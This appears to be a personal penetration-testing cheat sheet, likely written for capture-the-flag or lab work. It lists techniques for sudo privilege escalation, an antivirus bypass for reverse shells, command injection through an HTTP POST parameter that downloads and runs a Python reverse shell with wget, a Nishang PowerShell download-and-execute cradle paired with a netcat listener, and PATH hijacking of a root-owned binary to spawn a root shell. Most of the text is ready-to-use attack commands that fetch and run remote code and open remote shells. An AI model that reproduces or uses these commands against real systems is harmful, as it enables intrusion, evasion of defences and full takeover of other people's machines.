Sudo escalate:

sudo -l (to find possible commands run at root level)
sudo ${root_command} bash to open root shell

Unicorn (anti-virus bypass on reverse shell):

- use necessary command from help section
- run metasploit commands
- run script commands

http body request code execution reverse shell:

- Download python pty shells from https://github.com/infodox/python-pty-shells 
- run "python -m SimpleHttpServer" in same directory
- send POST request with parameter "x=wget <ip>:<port>/tcp_pty_backconnect.py -0 /dev/shm/.rev.py"
- check if successful with "cat /dev/shm/.rev.py"
- run "python tcp pty_shell_handler.py -b <ip>:<port>" to listen for reverse shell connection
- send request with paramter "x=python /dev/shm/.rev.py"

Nishang (PowerShell reverse shell on Windows machine):

- get Nishang from https://github.com/samratashok/nishang
- copy Invoke-PowershellTcp.ps1 to a separate directory
- copy the reverse shell example and paste it with filled contents at bottom of file
- run "nc -lvnp <port>" to listen for reverse shell
- run "python -m SimpleHttpServer" in same directory as PS script to serve for target server
- start PS on Win box with "c:\Windows\SysNative\WindowsPowershell\v1.0\powershell.exe IEX(New-Object Net.WebClient).downloadString('http://<ip>:<port>/Invoke-PowerShellTcp.ps1')" (this likely needs to be URL encoded)

Base command hijacking:

- find file that executes with root privileges
- run gdb <file-name> and step through until instruction found that makes system call, then 'x/s <mem-location>' from a memory location stated before the sys call
- find the system command from above using 'which <command>'
- create an executable bash file (echo "#!/bin/sh" >> <command>;echo "/bin/sh" >> <command>; chmod +x <command>)
- 'export PATH = <current-dir> : $PATH' to set current directory as highest priority for looking for executables when running commands
- run the root file and a root shell should open
